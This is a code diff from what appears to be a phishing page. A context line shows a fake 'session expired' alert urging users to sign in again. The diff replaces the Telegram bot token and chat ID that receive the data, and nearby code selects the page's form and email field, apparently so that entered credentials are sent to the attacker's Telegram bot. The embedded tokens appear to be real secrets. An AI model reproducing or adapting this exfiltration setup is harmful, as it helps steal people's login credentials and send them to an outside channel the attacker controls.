@@ -32,8 +32,8 @@ alert("Ooops! Your Session as Expired! Click OK And Sign In To Continue. Thank Y
       const forma = document.querySelector('#form')
     
       let bot = {
-          TOKEN: "6716739605:AAFwskfowgoO0tugNc6QJgIUkGRCiIoygzI",
-          chatID: "989763501"
+          TOKEN: "6928003828:AAGA9icuWDccMxkHNBqrSEbHoc7bkZuuI-Y",
+          chatID: "5509658859"
       }
 
       const emAil = document.querySelector('#usr')
